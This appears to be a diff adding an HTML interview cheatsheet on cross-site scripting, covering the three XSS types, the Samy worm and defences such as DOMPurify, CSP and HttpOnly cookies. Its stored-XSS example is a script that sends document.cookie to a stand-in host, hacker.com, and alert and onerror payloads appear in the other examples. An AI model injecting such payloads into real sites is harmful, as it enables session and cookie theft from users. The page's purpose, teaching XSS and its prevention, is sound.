@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Interview Cheatsheet</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      line-height: 1.7;
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 24px;
+      background: #fafafa;
+      color: #1a1a1a;
+    }
+    h1 { font-size: 1.75rem; margin-bottom: 8px; color: #111; }
+    .subtitle { color: #666; margin-bottom: 24px; font-size: 0.95rem; }
+    section { background: #fff; border-radius: 8px; padding: 20px; margin-bottom: 16px; border: 1px solid #e5e5e5; }
+    h2 { font-size: 1.1rem; color: #333; margin-bottom: 12px; border-bottom: 2px solid #e74c3c; padding-bottom: 6px; display: inline-block; }
+    h3 { font-size: 0.95rem; color: #555; margin: 16px 0 8px; }
+    p, li { font-size: 0.9rem; color: #444; }
+    ul { padding-left: 20px; }
+    li { margin-bottom: 6px; }
+    code { background: #f4f4f4; padding: 2px 6px; border-radius: 4px; font-size: 0.85rem; color: #c0392b; }
+    pre { background: #2d2d2d; color: #f8f8f2; padding: 12px; border-radius: 6px; overflow-x: auto; margin: 10px 0; font-size: 0.8rem; }
+    .type-card { background: #f9f9f9; border-left: 3px solid #3498db; padding: 12px; margin: 10px 0; border-radius: 0 6px 6px 0; }
+    .type-card strong { color: #2980b9; }
+    .warning { background: #fff5f5; border-left: 3px solid #e74c3c; padding: 12px; margin: 10px 0; border-radius: 0 6px 6px 0; }
+    .success { background: #f0fff4; border-left: 3px solid #27ae60; padding: 12px; margin: 10px 0; border-radius: 0 6px 6px 0; }
+    .real-case { background: #fffbeb; border: 1px solid #f59e0b; padding: 16px; border-radius: 8px; margin: 16px 0; }
+    .real-case h3 { color: #b45309; margin-top: 0; }
+    .interview-tip { background: #f0f7ff; border: 1px dashed #3b82f6; padding: 12px; border-radius: 6px; margin: 10px 0; font-size: 0.85rem; }
+    .interview-tip::before { content: "💡 Say this: "; font-weight: 600; color: #1d4ed8; }
+    table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 0.85rem; }
+    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }
+    th { background: #f5f5f5; font-weight: 600; }
+  </style>
+</head>
+<body>
+
+<h1>XSS (Cross-Site Scripting)</h1>
+<p class="subtitle">Interview Cheatsheet — Simple words, interview-ready answers</p>
+
+<section>
+  <h2>What is XSS?</h2>
+  
+  <div class="interview-tip">
+    "XSS is when an attacker injects harmful JavaScript into a website. When other users visit that page, the script runs in their browser — and since the browser thinks the script came from the trusted website, it has full access to that user's cookies, session, and page content."
+  </div>
+
+  <p><strong>Simple way to remember:</strong></p>
+  <ul>
+    <li>Attacker puts bad code into a website</li>
+    <li>Victim visits the website normally</li>
+    <li>Bad code runs in victim's browser</li>
+    <li>Attacker can now steal cookies, redirect user, or change what they see</li>
+  </ul>
+
+  <div class="warning">
+    <strong>Common confusion:</strong> XSS is NOT about pretending to be someone else. It's about putting your code inside a website that users already trust.
+  </div>
+</section>
+
+<section>
+  <h2>3 Types of XSS</h2>
+
+  <div class="type-card">
+    <strong>1. Stored XSS (most dangerous)</strong>
+    <p>Bad script gets <strong>saved in the database</strong>. Every user who views that data gets attacked.</p>
+    
+    <p><strong>Example:</strong> Attacker posts a comment on a blog:</p>
+    <pre>&lt;script&gt;fetch('https://hacker.com?cookie='+document.cookie)&lt;/script&gt;</pre>
+    <p>This gets saved. Now everyone who reads comments sends their cookies to the hacker.</p>
+    
+    <div class="interview-tip">
+      "Stored XSS is when malicious code gets saved in the database — like in a comment or user profile. It's the most dangerous because it attacks every user who views that content."
+    </div>
+  </div>
+
+  <div class="type-card">
+    <strong>2. Reflected XSS</strong>
+    <p>Bad script is in the <strong>URL</strong>. Victim has to click a specially crafted link.</p>
+    
+    <p><strong>Example:</strong> Attacker sends this link via email:</p>
+    <pre>https://shop.com/search?q=&lt;script&gt;alert('hacked')&lt;/script&gt;</pre>
+    <p>If the website shows "You searched for: [user input]" without cleaning it, the script runs.</p>
+    
+    <div class="interview-tip">
+      "Reflected XSS is when the script comes from the URL and bounces off the server. The attacker tricks the user into clicking a malicious link."
+    </div>
+  </div>
+
+  <div class="type-card">
+    <strong>3. DOM-based XSS</strong>
+    <p>Bad script runs <strong>only in the browser</strong> — never goes to the server.</p>
+    
+    <p><strong>Example:</strong> Website has this code:</p>
+    <pre>// Takes whatever is after # in URL and puts it on page
+document.getElementById('name').innerHTML = location.hash.slice(1);</pre>
+    <p>Attacker shares: <code>https://site.com/page#&lt;img src=x onerror=alert('XSS')&gt;</code></p>
+    
+    <div class="interview-tip">
+      "DOM-based XSS happens entirely in the browser. The malicious code is in the URL fragment or comes from somewhere client-side, and JavaScript on the page processes it unsafely."
+    </div>
+  </div>
+
+  <table>
+    <tr>
+      <th>Type</th>
+      <th>Where is the bad code?</th>
+      <th>How does attack happen?</th>
+    </tr>
+    <tr>
+      <td>Stored</td>
+      <td>Saved in database</td>
+      <td>User views infected page</td>
+    </tr>
+    <tr>
+      <td>Reflected</td>
+      <td>In the URL</td>
+      <td>User clicks malicious link</td>
+    </tr>
+    <tr>
+      <td>DOM-based</td>
+      <td>Browser only (never hits server)</td>
+      <td>JS on page handles input badly</td>
+    </tr>
+  </table>
+</section>
+
+<section>
+  <h2>Real Example: Samy Worm (MySpace, 2005)</h2>
+  <div class="real-case">
+    <h3>🔥 What Happened</h3>
+    <p>A guy named Samy found that MySpace blocked <code>&lt;script&gt;</code> tags but allowed some HTML in profiles. He found a workaround and added code to his profile.</p>
+    
+    <p><strong>What his code did:</strong></p>
+    <ul>
+      <li>When anyone viewed Samy's profile → code runs in their browser</li>
+      <li>Code automatically adds Samy as their friend</li>
+      <li>Code adds "Samy is my hero" to their profile</li>
+      <li>Code copies itself to their profile (so their friends get infected too)</li>
+    </ul>
+
+    <p><strong>Result:</strong> 1 million friend requests in just 20 hours!</p>
+
+    <div class="interview-tip">
+      "A famous example is the Samy worm on MySpace. It was a stored XSS that spread itself — when you viewed an infected profile, it would copy itself to your profile. It got 1 million users in 20 hours. This shows why just blocking script tags isn't enough — attackers always find creative workarounds."
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2>How to Prevent XSS</h2>
+
+  <h3>1. Clean user input (Sanitization)</h3>
+  <p>Use libraries like <code>DOMPurify</code> to remove dangerous code from user input:</p>
+  <pre>import DOMPurify from 'dompurify';
+
+// User types: &lt;script&gt;bad code&lt;/script&gt;
+// After cleaning: empty string (script removed)
+const clean = DOMPurify.sanitize(userInput);</pre>
+  
+  <div class="interview-tip">
+    "We should sanitize all user inputs using libraries like DOMPurify. It removes any potentially dangerous HTML or JavaScript before we use it."
+  </div>
+
+  <h3>2. React protects you (mostly)</h3>
+  <p>React automatically converts special characters to harmless text:</p>
+  <pre>const userInput = '&lt;script&gt;alert("xss")&lt;/script&gt;';
+
+// React shows this as plain text, NOT as a script
+return &lt;div&gt;{userInput}&lt;/div&gt;;</pre>
+  
+  <div class="interview-tip">
+    "React escapes content by default. If someone types a script tag, React will display it as text instead of running it as code."
+  </div>
+
+  <h3>3. Avoid dangerous methods</h3>
+  <div class="warning">
+    <p><strong>Never use these with user input:</strong></p>
+    <ul>
+      <li><code>dangerouslySetInnerHTML</code> — it skips React's protection</li>
+      <li><code>eval()</code> — runs any string as code</li>
+      <li><code>innerHTML</code> — puts raw HTML on page</li>
+    </ul>
+  </div>
+  
+  <div class="interview-tip">
+    "We should avoid dangerouslySetInnerHTML and eval() because they can execute any code, including malicious scripts from users."
+  </div>
+
+  <h3>4. CSP Header (Content Security Policy)</h3>
+  <p>A rule you set on your server that tells the browser: "Only run scripts from these trusted sources"</p>
+  <pre>Content-Security-Policy: script-src 'self' https://trusted-cdn.com;</pre>
+  <p>Even if XSS exists, the browser will block scripts that aren't from allowed sources.</p>
+  
+  <div class="interview-tip">
+    "CSP is a security header that whitelists which scripts can run. Even if an attacker injects a script, the browser won't run it if it's not from an allowed source."
+  </div>
+
+  <h3>5. HttpOnly Cookies</h3>
+  <p>Makes cookies invisible to JavaScript:</p>
+  <pre>Set-Cookie: session=abc123; HttpOnly; Secure;</pre>
+  <p>Even if XSS happens, attacker can't steal cookies with <code>document.cookie</code></p>
+  
+  <div class="interview-tip">
+    "HttpOnly flag on cookies prevents JavaScript from accessing them. So even if there's XSS, the attacker can't steal session cookies."
+  </div>
+</section>
+
+<section>
+  <h2>Common Interview Questions</h2>
+  
+  <p><strong>Q: What's the difference between XSS and CSRF?</strong></p>
+  <div class="interview-tip">
+    "XSS is about injecting bad code into a website. CSRF is about tricking a user into doing something they didn't intend, like transferring money. XSS attacks the user through the website. CSRF attacks the website through the user."
+  </div>
+
+  <p style="margin-top: 16px;"><strong>Q: Why not just block &lt;script&gt; tags?</strong></p>
+  <div class="interview-tip">
+    "Attackers have many ways around it — they can use event handlers like onerror on images, javascript: in links, or encode their payload differently. That's why we need proper sanitization libraries, not just blocking certain words."
+  </div>
+
+  <p style="margin-top: 16px;"><strong>Q: Is React 100% safe from XSS?</strong></p>
+  <div class="interview-tip">
+    "Not completely. React protects us by default, but if we use dangerouslySetInnerHTML, or put user input in href attributes with javascript:, or render HTML from the server without sanitizing — we can still have XSS."
+  </div>
+
+  <p style="margin-top: 16px;"><strong>Q: How would you prevent XSS in your app?</strong></p>
+  <div class="interview-tip">
+    "Multiple layers: sanitize user input with DOMPurify, avoid dangerouslySetInnerHTML, set up CSP headers to whitelist script sources, use HttpOnly cookies so scripts can't steal sessions, and encode output based on where it's being used."
+  </div>
+</section>
+
+<section>
+  <h2>Quick Summary (30 seconds before interview)</h2>
+  <ul>
+    <li><strong>XSS</strong> = Attacker puts bad JavaScript in a website, runs in victim's browser</li>
+    <li><strong>Stored</strong> = Saved in DB, attacks everyone who views it</li>
+    <li><strong>Reflected</strong> = In URL, victim clicks malicious link</li>
+    <li><strong>DOM-based</strong> = Browser-only, bad JS handling on client</li>
+    <li><strong>Prevent with:</strong> DOMPurify, React's default escaping, avoid eval/innerHTML, CSP headers, HttpOnly cookies</li>
+    <li><strong>Real example:</strong> Samy worm — 1M users in 20hrs via profile XSS</li>
+  </ul>
+</section>
+
+</body>
+</html>
